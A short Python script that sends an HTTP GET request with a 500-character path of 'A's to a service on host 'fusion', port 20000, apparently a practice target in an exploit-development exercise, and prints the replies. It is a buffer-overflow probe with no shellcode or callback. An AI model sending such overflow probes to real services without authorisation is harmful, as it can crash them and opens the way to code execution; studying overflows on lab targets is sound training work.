import socket
import sys

def send_payload(payload):
  # Create a TCP/IP socket
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  # Connect the socket to the port where the server is listening
  server_address = ('fusion', 20000)
  print('connecting to {} port {}'.format(server_address[0], server_address[1]))
  sock.connect(server_address)

  try:
      # Send data
      message = payload
      print('sending {}'.format(message))
      sock.sendall(str.encode(message))


      data = sock.recv(4090)
      print('received {}'.format(data))
      data = sock.recv(4090)
      print('received {}'.format(data))
      data = sock.recv(4090)
      print('received {}'.format(data))

  finally:
      print('closing socket')
      sock.close()

mode = 'GET'
path = '/' + 'A'*500
protocol = 'HTTP/1.1'
payload = ''

payload = '{} {} {} {}'.format(mode, path, protocol, payload)
send_payload(payload)

